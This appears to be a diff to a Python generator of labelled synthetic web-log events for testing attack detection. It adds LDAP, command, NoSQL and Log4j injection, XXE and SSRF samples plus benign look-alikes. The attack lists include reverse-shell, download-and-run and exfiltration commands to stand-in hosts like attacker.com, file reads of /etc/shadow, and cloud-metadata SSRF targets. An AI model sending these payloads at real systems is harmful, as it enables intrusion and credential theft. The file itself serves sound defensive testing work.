@@ -424,6 +424,294 @@ def _gen_path_traversal(base_time: datetime, rng: random.Random) -> list:
     return events
 
 
+def _gen_ldap_injection(base_time: datetime, rng: random.Random) -> list:
+    """T1213 — LDAP Injection attacks."""
+    events = []
+    src = rng.choice(EXTERNAL_IPS)
+    target = rng.choice(INTERNAL_IPS)
+    
+    ldap_payloads = [
+        "*)(uid=*",           # Wildcard search
+        "*)(objectClass=*",   # All objects
+        "admin)(|(password=*", # OR injection
+        "*)(uid=*))(&(uid=*", # Complex bypass
+        "*))(&(objectClass=*", # Comment injection
+        "admin*",             # Wildcard at end
+        ")(sn=*",             # Opening bracket injection
+        "*)(|&(objectClass=person", # Boolean AND
+        "cn=admin)(&()",     # Empty AND
+        "(uid=*))(|(uid=*",   # Nested query
+    ]
+    
+    endpoints = ["/ldap/search", "/api/users", "/auth/ldap", "/directory/query"]
+    params = ["filter", "query", "dn", "search", "user"]
+    
+    payload = rng.choice(ldap_payloads)
+    endpoint = rng.choice(endpoints)
+    param = rng.choice(params)
+    url = f"http://app.internal{endpoint}?{param}={payload}"
+    
+    events.append({
+        "timestamp": _ts(base_time),
+        "sourcetype": "web",
+        "src_ip": src,
+        "dest_ip": target,
+        "dest_port": 80,
+        "url": url,
+        "request": f"GET {endpoint}?{param}={payload} HTTP/1.1",
+        "body": f"{param}={payload}",
+        "method": "GET",
+        "user_agent": "Mozilla/5.0",
+        "event_type": "http",
+        "message": f"LDAP injection: {payload[:40]}...",
+        "label": "malicious",
+        "attack_type": "ldap_injection",
+        "mitre": "T1213"
+    })
+
+    return events
+
+
+def _gen_command_injection(base_time: datetime, rng: random.Random) -> list:
+    """T1059 — Command Injection attacks."""
+    events = []
+    src = rng.choice(EXTERNAL_IPS)
+    target = rng.choice(INTERNAL_IPS)
+    
+    cmd_payloads = [
+        {"sep": ";", "cmd": "cat /etc/passwd"},
+        {"sep": "|", "cmd": "whoami"},
+        {"sep": "\u0026\u0026", "cmd": "id"},
+        {"sep": "`", "cmd": "uname -a"},
+        {"sep": "$(", "cmd": "ls -la"},
+        {"sep": ";", "cmd": "curl http://evil.com/exfil"},
+        {"sep": "|", "cmd": "nc -e /bin/sh 1.2.3.4 4444"},
+        {"sep": ";", "cmd": "wget -O- http://attacker.com/shell.sh | bash"},
+        {"sep": "\u0026", "cmd": "python -c 'import socket,subprocess,os'"},
+        {"sep": ";", "cmd": "powershell IEX(New-Object Net.WebClient).DownloadString"},
+    ]
+    
+    endpoints = ["/api/exec", "/ping", "/tools/dig", "/debug/command", "/test/system"]
+    params = ["host", "domain", "cmd", "command", "exec", "input"]
+    
+    payload = rng.choice(cmd_payloads)
+    endpoint = rng.choice(endpoints)
+    param = rng.choice(params)
+    full_cmd = f"{payload['sep']}{payload['cmd']}"
+    url = f"http://app.internal{endpoint}?{param}=example.com{full_cmd}"
+    
+    events.append({
+        "timestamp": _ts(base_time),
+        "sourcetype": "web",
+        "src_ip": src,
+        "dest_ip": target,
+        "dest_port": 80,
+        "url": url,
+        "request": f"GET {endpoint}?{param}=example.com{full_cmd} HTTP/1.1",
+        "body": "",
+        "command": full_cmd,
+        "method": "GET",
+        "user_agent": "Mozilla/5.0",
+        "event_type": "http",
+        "message": f"Command injection: {full_cmd[:40]}...",
+        "label": "malicious",
+        "attack_type": "command_injection",
+        "mitre": "T1059"
+    })
+
+    return events
+
+
+def _gen_xxe_attack(base_time: datetime, rng: random.Random) -> list:
+    """T1059 — XML External Entity (XXE) attacks."""
+    events = []
+    src = rng.choice(EXTERNAL_IPS)
+    target = rng.choice(INTERNAL_IPS)
+    
+    xxe_payloads = [
+        '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>''',
+        '''<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/shadow">]><data>&file;</data>''',
+        '''<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://attacker.com/steal">]><test>&xxe;</test>''',
+        '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///proc/self/environ">%xxe;]>''',
+        '''<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>''',
+        '''<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>''',
+        '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>''',
+        '''<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>''',
+    ]
+    
+    endpoints = ["/api/xml", "/soap", "/upload/xml", "/import", "/process"]
+    
+    payload = rng.choice(xxe_payloads)
+    endpoint = rng.choice(endpoints)
+    
+    events.append({
+        "timestamp": _ts(base_time),
+        "sourcetype": "web",
+        "src_ip": src,
+        "dest_ip": target,
+        "dest_port": 80,
+        "url": f"http://app.internal{endpoint}",
+        "request": f"POST {endpoint} HTTP/1.1",
+        "body": payload,
+        "method": "POST",
+        "content_type": "application/xml",
+        "user_agent": "Mozilla/5.0",
+        "event_type": "http",
+        "message": f"XXE attempt: {payload[:50]}...",
+        "label": "malicious",
+        "attack_type": "xxe",
+        "mitre": "T1059"
+    })
+
+    return events
+
+
+def _gen_ssrf_attack(base_time: datetime, rng: random.Random) -> list:
+    """T1189 — Server-Side Request Forgery (SSRF) attacks."""
+    events = []
+    src = rng.choice(EXTERNAL_IPS)
+    target = rng.choice(INTERNAL_IPS)
+    
+    ssrf_payloads = [
+        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
+        "http://169.254.169.254/metadata/v1/",       # DigitalOcean
+        "http://metadata.google.internal/",          # GCP metadata
+        "http://10.0.0.1/admin",                     # Internal IP
+        "http://192.168.1.1/config",                 # Router config
+        "http://127.0.0.1:22/",                      # Local SSH
+        "http://0.0.0.0:8080/api",                   # All interfaces
+        "http://[::ffff:169.254.169.254]/",          # IPv6 bypass
+        "file:///etc/passwd",                        # File protocol
+        "dict://127.0.0.1:6379/info",                # Redis
+        "gopher://127.0.0.1:9000/",                  # PHP-FPM
+        "ftp://anonymous@10.0.0.5:21/",              # Internal FTP
+    ]
+    
+    endpoints = ["/api/fetch", "/proxy", "/webhook", "/import", "/preview"]
+    params = ["url", "target", "endpoint", "uri", "resource"]
+    
+    payload = rng.choice(ssrf_payloads)
+    endpoint = rng.choice(endpoints)
+    param = rng.choice(params)
+    url = f"http://app.internal{endpoint}?{param}={payload.replace('/', '%2F')}"
+    
+    events.append({
+        "timestamp": _ts(base_time),
+        "sourcetype": "web",
+        "src_ip": src,
+        "dest_ip": target,
+        "dest_port": 80,
+        "url": url,
+        "request": f"GET {endpoint}?{param}={payload} HTTP/1.1",
+        "body": "",
+        "ssrf_target": payload,
+        "method": "GET",
+        "user_agent": "Mozilla/5.0",
+        "event_type": "http",
+        "message": f"SSRF attempt: {payload[:40]}...",
+        "label": "malicious",
+        "attack_type": "ssrf",
+        "mitre": "T1189"
+    })
+
+    return events
+
+
+def _gen_nosql_injection(base_time: datetime, rng: random.Random) -> list:
+    """T1190 — NoSQL Injection attacks (MongoDB, etc.)."""
+    events = []
+    src = rng.choice(EXTERNAL_IPS)
+    target = rng.choice(INTERNAL_IPS)
+    
+    nosql_payloads = [
+        '{"$ne": null}',
+        '{"$gt": ""}',
+        '{"$regex": ".*"}',
+        '{"$where": "this.password.length > 0"}',
+        '{"username": {"$ne": null}, "password": {"$ne": null}}',
+        '{"$or": [{"username": "admin"}, {"username": {"$ne": null}}]}',
+        '{"username": {"$in": ["admin", "root", "user"]}}',
+        '{"$and": [{"username": "admin"}, {"$where": "sleep(5000)"}]}',
+        '{"username": {"$exists": true}}',
+        '{"password": {"$exists": false}}',
+    ]
+    
+    endpoints = ["/api/users", "/auth/login", "/api/query", "/db/search"]
+    
+    payload = rng.choice(nosql_payloads)
+    endpoint = rng.choice(endpoints)
+    
+    events.append({
+        "timestamp": _ts(base_time),
+        "sourcetype": "web",
+        "src_ip": src,
+        "dest_ip": target,
+        "dest_port": 80,
+        "url": f"http://app.internal{endpoint}",
+        "request": f"POST {endpoint} HTTP/1.1",
+        "body": payload,
+        "method": "POST",
+        "content_type": "application/json",
+        "user_agent": "Mozilla/5.0",
+        "event_type": "http",
+        "message": f"NoSQL injection: {payload[:40]}...",
+        "label": "malicious",
+        "attack_type": "nosql_injection",
+        "mitre": "T1190"
+    })
+
+    return events
+
+
+def _gen_log4j_attack(base_time: datetime, rng: random.Random) -> list:
+    """T1190 — Log4j / JNDI Injection (CVE-2021-44228)."""
+    events = []
+    src = rng.choice(EXTERNAL_IPS)
+    target = rng.choice(INTERNAL_IPS)
+    
+    log4j_payloads = [
+        "${jndi:ldap://attacker.com/a}",
+        "${jndi:rmi://attacker.com:1099/exploit}",
+        "${jndi:dns://attacker.com}",
+        "${jndi:ldap://attacker.com:1389/Exploit}",
+        "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com}",  # Obfuscated
+        "${jndi:ldap://127.0.0.1#attacker.com/a}",  # Bypass
+        "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//attacker.com}",
+        "${jndi:ldap://attacker.com/Exploit.class}",
+        "${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attacker.com}",
+        "${${::-j}ndi:ldap://attacker.com}",
+    ]
+    
+    # JNDI can be injected via any header field
+    headers = ["User-Agent", "X-Api-Version", "X-Forwarded-For", "Referer", "Accept", "Cookie"]
+    endpoints = ["/api/log", "/", "/api/headers", "/webhook"]
+    
+    payload = rng.choice(log4j_payloads)
+    endpoint = rng.choice(endpoints)
+    header_name = rng.choice(headers)
+    
+    events.append({
+        "timestamp": _ts(base_time),
+        "sourcetype": "web",
+        "src_ip": src,
+        "dest_ip": target,
+        "dest_port": 80,
+        "url": f"http://app.internal{endpoint}",
+        "request": f"GET {endpoint} HTTP/1.1",
+        "body": "",
+        "headers": {header_name: payload},
+        "user_agent": payload if header_name == "User-Agent" else "Mozilla/5.0",
+        "method": "GET",
+        "event_type": "http",
+        "message": f"Log4j JNDI injection in {header_name}: {payload[:40]}...",
+        "label": "malicious",
+        "attack_type": "log4j",
+        "mitre": "T1190"
+    })
+
+    return events
+
+
 # ═══ STEALTHY attack variants (harder to detect) ═════════════════════════════
 
 def _gen_slow_brute_force(base_time: datetime, rng: random.Random) -> list:
@@ -1041,11 +1329,9 @@ def _gen_benign_file_access(base_time: datetime, rng: random.Random) -> list:
         "static/./css/main.css",
         "docs/v1.2/../v2.0/api.md",
         "../../../home/user/project/README.md",
-        
         # Windows-style
         "..\\..\\shared\\documents\\report.pdf",
         "templates\\..\\..\\config.yaml",
-        
         # Encoded dots (legitimate URL encoding)
         "file%2ename.txt",
         "path%2f%2eto%2fresource",
@@ -1068,6 +1354,231 @@ def _gen_benign_file_access(base_time: datetime, rng: random.Random) -> list:
         "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
         "event_type": "http",
         "message": f"Benign file access: {path[:40]}...",
+        "label": "benign",
+        "attack_type": "none"
+    })
+
+    return events
+
+
+def _gen_benign_ldap_query(base_time: datetime, rng: random.Random) -> list:
+    """Benign LDAP queries that might look like injection."""
+    events = []
+    src = rng.choice(INTERNAL_IPS)
+    
+    # Legitimate LDAP filter patterns
+    legit_filters = [
+        "(uid=john.doe)",
+        "(cn=admin)",
+        "(&(objectClass=person)(department=engineering))",
+        "(|(mail=john@example.com)(mail=jdoe@example.com))",
+        "(sn=Smith*)",
+        "(&(uid=user1)(objectClass=inetOrgPerson))",
+    ]
+    
+    filter_str = rng.choice(legit_filters)
+    endpoint = rng.choice(["/ldap/search", "/api/directory"])
+    
+    events.append({
+        "timestamp": _ts(base_time),
+        "sourcetype": "web",
+        "src_ip": src,
+        "dest_ip": rng.choice(INTERNAL_IPS),
+        "dest_port": 80,
+        "url": f"http://app.internal{endpoint}?filter={filter_str}",
+        "request": f"GET {endpoint}?filter={filter_str} HTTP/1.1",
+        "body": f"filter={filter_str}",
+        "method": "GET",
+        "user_agent": "Mozilla/5.0",
+        "event_type": "http",
+        "message": f"LDAP query: {filter_str[:40]}...",
+        "label": "benign",
+        "attack_type": "none"
+    })
+
+    return events
+
+
+def _gen_benign_command_exec(base_time: datetime, rng: random.Random) -> list:
+    """Benign command execution patterns."""
+    events = []
+    src = rng.choice(INTERNAL_IPS)
+    
+    # Legitimate pipe/command usage
+    legit_commands = [
+        "sort | uniq",
+        "grep pattern | wc -l",
+        "echo hello && echo world",
+        "cat file | head -n 10",
+        "date; uptime",
+    ]
+    
+    cmd = rng.choice(legit_commands)
+    endpoint = rng.choice(["/api/tool", "/debug/status"])
+    
+    events.append({
+        "timestamp": _ts(base_time),
+        "sourcetype": "web",
+        "src_ip": src,
+        "dest_ip": rng.choice(INTERNAL_IPS),
+        "dest_port": 80,
+        "url": f"http://app.internal{endpoint}?cmd={cmd}",
+        "request": f"GET {endpoint}?cmd={cmd} HTTP/1.1",
+        "body": "",
+        "command": cmd,
+        "method": "GET",
+        "user_agent": "Mozilla/5.0",
+        "event_type": "http",
+        "message": f"Benign command: {cmd[:40]}...",
+        "label": "benign",
+        "attack_type": "none"
+    })
+
+    return events
+
+
+def _gen_benign_xml_content(base_time: datetime, rng: random.Random) -> list:
+    """Benign XML content with entities."""
+    events = []
+    src = rng.choice(INTERNAL_IPS)
+    
+    # Legitimate XML with internal entities
+    legit_xml = [
+        "<?xml version=\"1.0\"?><!DOCTYPE note [<!ENTITY writer \"Writer: Donald Duck\">]><note><to>Tove</to><from>Jani</from><heading>Reminder</heading><body>Don't forget me this weekend</body>&writer;</note>",
+        "<?xml version=\"1.0\"?><config><database>localhost</database><port>5432</port></config>",
+        "<?xml version=\"1.0\" encoding=\"UTF-8\"?><user><name>John</name><email>john@example.com</email></user>",
+    ]
+    
+    xml = rng.choice(legit_xml)
+    endpoint = rng.choice(["/api/xml", "/upload/config"])
+    
+    events.append({
+        "timestamp": _ts(base_time),
+        "sourcetype": "web",
+        "src_ip": src,
+        "dest_ip": rng.choice(INTERNAL_IPS),
+        "dest_port": 80,
+        "url": f"http://app.internal{endpoint}",
+        "request": f"POST {endpoint} HTTP/1.1",
+        "body": xml,
+        "method": "POST",
+        "content_type": "application/xml",
+        "user_agent": "Mozilla/5.0",
+        "event_type": "http",
+        "message": f"XML content: {xml[:50]}...",
+        "label": "benign",
+        "attack_type": "none"
+    })
+
+    return events
+
+
+def _gen_benign_url_fetch(base_time: datetime, rng: random.Random) -> list:
+    """Benign URL fetching that might look like SSRF."""
+    events = []
+    src = rng.choice(INTERNAL_IPS)
+    
+    # Legitimate external URLs
+    legit_urls = [
+        "https://api.github.com/users/octocat",
+        "https://api.twitter.com/1.1/statuses/user_timeline.json",
+        "https://hooks.slack.com/services/T000/B000/XXXX",
+        "https://api.stripe.com/v1/customers",
+    ]
+    
+    url = rng.choice(legit_urls)
+    endpoint = rng.choice(["/api/webhook", "/proxy/fetch"])
+    
+    events.append({
+        "timestamp": _ts(base_time),
+        "sourcetype": "web",
+        "src_ip": src,
+        "dest_ip": rng.choice(INTERNAL_IPS),
+        "dest_port": 80,
+        "url": f"http://app.internal{endpoint}?url={url}",
+        "request": f"GET {endpoint}?url={url} HTTP/1.1",
+        "body": "",
+        "ssrf_target": url,
+        "method": "GET",
+        "user_agent": "Mozilla/5.0",
+        "event_type": "http",
+        "message": f"URL fetch: {url[:40]}...",
+        "label": "benign",
+        "attack_type": "none"
+    })
+
+    return events
+
+
+def _gen_benign_json_query(base_time: datetime, rng: random.Random) -> list:
+    """Benign JSON queries that might look like NoSQL injection."""
+    events = []
+    src = rng.choice(INTERNAL_IPS)
+    
+    # Legitimate JSON queries
+    legit_json = [
+        '{"username": "john.doe", "active": true}',
+        '{"department": "engineering", "role": "senior"}',
+        '{"created": {"$gte": "2024-01-01", "$lte": "2024-12-31"}}',
+        '{"tags": {"$in": ["urgent", "critical"]}}',
+        '{"status": "active", "verified": true}',
+    ]
+    
+    json_str = rng.choice(legit_json)
+    endpoint = rng.choice(["/api/query", "/search"])
+    
+    events.append({
+        "timestamp": _ts(base_time),
+        "sourcetype": "web",
+        "src_ip": src,
+        "dest_ip": rng.choice(INTERNAL_IPS),
+        "dest_port": 80,
+        "url": f"http://app.internal{endpoint}",
+        "request": f"POST {endpoint} HTTP/1.1",
+        "body": json_str,
+        "method": "POST",
+        "content_type": "application/json",
+        "user_agent": "Mozilla/5.0",
+        "event_type": "http",
+        "message": f"JSON query: {json_str[:40]}...",
+        "label": "benign",
+        "attack_type": "none"
+    })
+
+    return events
+
+
+def _gen_benign_headers(base_time: datetime, rng: random.Random) -> list:
+    """Benign requests with various headers."""
+    events = []
+    src = rng.choice(INTERNAL_IPS)
+    
+    # Normal header values that might contain special chars
+    header_values = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "application/json, text/plain, */*",
+        "en-US,en;q=0.9,fr;q=0.8",
+        "gzip, deflate, br",
+        "session=abc123; user=john; prefs=dark_mode",
+    ]
+    
+    ua = rng.choice(header_values)
+    endpoint = rng.choice(["/", "/api/headers", "/webhook"])
+    
+    events.append({
+        "timestamp": _ts(base_time),
+        "sourcetype": "web",
+        "src_ip": src,
+        "dest_ip": rng.choice(INTERNAL_IPS),
+        "dest_port": 80,
+        "url": f"http://app.internal{endpoint}",
+        "request": f"GET {endpoint} HTTP/1.1",
+        "body": "",
+        "headers": {"User-Agent": ua, "Accept": "application/json"},
+        "user_agent": ua,
+        "method": "GET",
+        "event_type": "http",
+        "message": f"Request with headers: {ua[:40]}...",
         "label": "benign",
         "attack_type": "none"
     })
@@ -1158,6 +1669,12 @@ ATTACK_GENERATORS = {
     "rce":                  (_gen_rce_attack, 12),
     "xss":                  (_gen_xss_attack, 10),
     "path_traversal":       (_gen_path_traversal, 10),
+    "ldap_injection":       (_gen_ldap_injection, 10),
+    "command_injection":    (_gen_command_injection, 10),
+    "xxe":                  (_gen_xxe_attack, 8),
+    "ssrf":                 (_gen_ssrf_attack, 10),
+    "nosql_injection":      (_gen_nosql_injection, 10),
+    "log4j":                (_gen_log4j_attack, 10),
 }
 
 # Stealthy attacks (harder to detect — distinguishes good from great detection)
@@ -1180,6 +1697,12 @@ BENIGN_GENERATORS = [
     (_gen_normal_http, 100),        # Normal web traffic
     (_gen_benign_api_call, 30),     # API calls that look like attacks but aren't
     (_gen_benign_file_access, 20),  # File access that looks like traversal
+    (_gen_benign_ldap_query, 15),   # LDAP queries that look like injection
+    (_gen_benign_command_exec, 15), # Command patterns that look like injection
+    (_gen_benign_xml_content, 15),  # XML with entities that look like XXE
+    (_gen_benign_url_fetch, 15),    # URL fetching that looks like SSRF
+    (_gen_benign_json_query, 15),   # JSON that looks like NoSQL injection
+    (_gen_benign_headers, 15),      # Headers that look like Log4j
 ]
 
 # Noisy benign (designed to trigger false positives in naive rules)
